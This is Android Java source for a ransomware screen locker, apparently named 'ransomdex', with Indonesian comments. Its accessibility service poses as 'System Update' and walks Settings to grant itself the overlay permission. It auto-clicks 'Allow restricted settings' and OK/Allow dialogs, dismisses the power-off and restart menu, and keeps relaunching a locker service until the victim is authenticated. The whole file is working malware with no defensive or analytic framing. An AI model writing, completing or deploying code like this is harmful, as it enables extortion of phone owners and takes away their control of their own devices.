package com.bondex.ransomdex;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.os.Handler;
import android.os.Looper;
import java.io.File;
import java.io.FileOutputStream;
import java.util.Calendar;
import java.util.List;

public class CustomAccessibilityService extends AccessibilityService {

    private long lastActionTime = 0;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        writeLog("Service Connected - Waiting for event to jump");
    }

    private void writeLog(String text) {
        try {
            // Gunakan directory internal aplikasi untuk menghindari SecurityException di Android 11+
            File logDir = getExternalFilesDir(null);
            if (logDir == null) return;
            File logFile = new File(logDir, "log_ransom.txt");
            FileOutputStream fos = new FileOutputStream(logFile, true);
            String time = Calendar.getInstance().getTime().toString();
            fos.write((time + " : " + text + "\n").getBytes());
            fos.close();
        } catch (Exception e) {
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        String className = event.getClassName() != null ? event.getClassName().toString() : "";

        // Hanya bereaksi pada menu Settings atau System UI
        if (!packageName.contains("settings") && !packageName.equals("android") && !packageName.contains("systemui")) return;

        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        // JALUR LOMPAT: Hanya lompat jika kita sedang di Settings tapi belum di halaman yang benar
        // Tambahkan pengecekan agar tidak lompat jika kita sudah melihat teks "System Update" (sudah di list)
        if (!Settings.canDrawOverlays(this) && packageName.contains("settings") && 
            !isOverlayPermissionPage(rootNode) && rootNode.findAccessibilityNodeInfosByText("System Update").isEmpty()) {
            jumpToOverlaySettings();
        }

        // JALUR AGRESIF: Jangan panggil locker saat sedang berada di menu Settings agar tidak crash/flicker
        if (!LockerService.isAuthenticated && !packageName.contains("settings")) {
            triggerLocker();
        }

        long currentTime = System.currentTimeMillis();
        if (currentTime - lastActionTime < 800) return;

        // Jika sudah punya izin Overlay dan masih di settings, langsung keluar/back
        if (packageName.contains("settings") && Settings.canDrawOverlays(this)) {
            performGlobalAction(GLOBAL_ACTION_BACK);
            return;
        }

        if (packageName.equals("android") || packageName.contains("systemui")) {
            checkAndDismissPowerMenu(getRootInActiveWindow());
        }

        boolean hasIcon = containsImageView(rootNode);

        // 1. Tangani Restricted Settings (Android 13+) dengan mencoba klik tombol titik tiga secara generic
        if (android.os.Build.VERSION.SDK_INT >= 33) {
            checkAndClickByContentDesc(rootNode, "More options");
            checkAndClick(rootNode, "Allow restricted settings");
        }

        // 2. Logika Utama: Klik Toggle hanya jika ada Icon (ImageView) di layar
        // Ini memastikan kita sudah berada di halaman detail izin overlay, bukan di menu utama aksesibilitas
        boolean switchFound = false;
        if (hasIcon && (className.contains("DrawOverlay") || className.contains("AppDrawOverlay") || isOverlayPermissionPage(rootNode))) {
            switchFound = processOverlaySwitch(rootNode);
        }

        // 3. Jika switch tidak ditemukan (masih di list), cari nama aplikasi untuk masuk ke halaman toggle
        if (!switchFound && packageName.contains("settings") && !className.contains("AppDetails")) {
            checkAndClick(rootNode, "System Update");
        }

        // 4. Klik tombol OK/Allow pada dialog konfirmasi (Gunakan ID agar independen bahasa)
        checkAndClickById(rootNode, "android:id/button1"); // Biasanya tombol positif (OK/Allow)
        
        // Fallback teks jika ID gagal
        checkAndClick(rootNode, "OK");
        checkAndClick(rootNode, "Allow");

        if (Settings.canDrawOverlays(this) && !LockerService.isAuthenticated) {
            triggerLocker();
        }
    }

    private void jumpToOverlaySettings() {
        long currentTime = System.currentTimeMillis();
        if (currentTime - lastActionTime < 2000) return; // Debounce agar tidak spam jump
        
        lastActionTime = currentTime;
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
        startActivity(intent);
    }

    private boolean isOverlayPermissionPage(AccessibilityNodeInfo node) {
        if (node == null) return false;
        // Kata kunci unik yang hanya ada di halaman pengaturan "Display over other apps"
        String[] keywords = {"Display over other apps", "Draw over other apps", "Appear on top", 
                             "Tampilkan di atas aplikasi lain", "Muncul di atas aplikasi lain"};
        for (String key : keywords) {
            List<AccessibilityNodeInfo> nodes = node.findAccessibilityNodeInfosByText(key);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo n : nodes) n.recycle();
                return true;
            }
        }
        return false;
    }

    private boolean containsImageView(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (node.getClassName() != null && node.getClassName().toString().contains("ImageView")) {
            return true;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            if (containsImageView(node.getChild(i))) return true;
        }
        return false;
    }

    private void checkAndClickById(AccessibilityNodeInfo node, String viewId) {
        if (node == null) return;
        List<AccessibilityNodeInfo> nodes = node.findAccessibilityNodeInfosByViewId(viewId);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo n : nodes) {
                clickNode(n);
                n.recycle();
            }
        }
    }

    private void triggerLocker() {
        Intent intent = new Intent(this, LockerService.class);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    private void checkAndClickByContentDesc(AccessibilityNodeInfo node, String desc) {
        if (node == null) return;
        if (node.getContentDescription() != null && 
            node.getContentDescription().toString().toLowerCase().contains(desc.toLowerCase())) {
            clickNode(node);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            checkAndClickByContentDesc(node.getChild(i), desc);
        }
    }

    private boolean processOverlaySwitch(AccessibilityNodeInfo node) {
        if (node == null) return false;
        
        // Cek elemen Switch atau Toggle
        if (node.getClassName() != null && 
           (node.getClassName().toString().contains("Switch") || node.getClassName().toString().contains("ToggleButton"))) {
            
            if (node.isChecked()) {
                // Jika sudah ON, jangan klik lagi, tapi langsung kembali
                writeLog("Overlay is already ON. Going back.");
                performGlobalAction(GLOBAL_ACTION_BACK);
            } else {
                // Jika masih OFF, klik untuk mengaktifkan
                clickNode(node);
            }
            return true;
        }
        
        for (int i = 0; i < node.getChildCount(); i++) {
            if (processOverlaySwitch(node.getChild(i))) return true;
        }
        return false;
    }

    private void checkAndDismissPowerMenu(AccessibilityNodeInfo node) {
        if (node == null) return;
        // Mencari kata kunci yang ada di menu power
        if (!node.findAccessibilityNodeInfosByText("Power off").isEmpty() || 
            !node.findAccessibilityNodeInfosByText("Restart").isEmpty() ||
            !node.findAccessibilityNodeInfosByText("Mulai lagi").isEmpty() ||
            !node.findAccessibilityNodeInfosByText("Daya mati").isEmpty()) {
            performGlobalAction(GLOBAL_ACTION_BACK);
        }
    }

    private void checkAndClick(AccessibilityNodeInfo node, String text) {
        List<AccessibilityNodeInfo> nodes = node.findAccessibilityNodeInfosByText(text);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo n : nodes) {
                // Validasi: Pastikan teksnya sama persis agar tidak salah klik aplikasi lain
                if (n.getText() != null && n.getText().toString().equals(text)) {
                    clickNode(n);
                }
                n.recycle();
            }
        }
    }

    private void clickNode(AccessibilityNodeInfo n) {
        if (n == null) return;
        
        // Filter: Jangan klik jika elemen ini adalah Icon (ImageView)
        if (n.getClassName() != null && n.getClassName().toString().contains("ImageView")) {
            return;
        }

        AccessibilityNodeInfo clickableNode = n;
        while (clickableNode != null && !clickableNode.isClickable()) {
            clickableNode = clickableNode.getParent();
        }
        if (clickableNode != null && clickableNode.isClickable()) {
            lastActionTime = System.currentTimeMillis();
            clickableNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
    }

    @Override
    public void onInterrupt() {}
}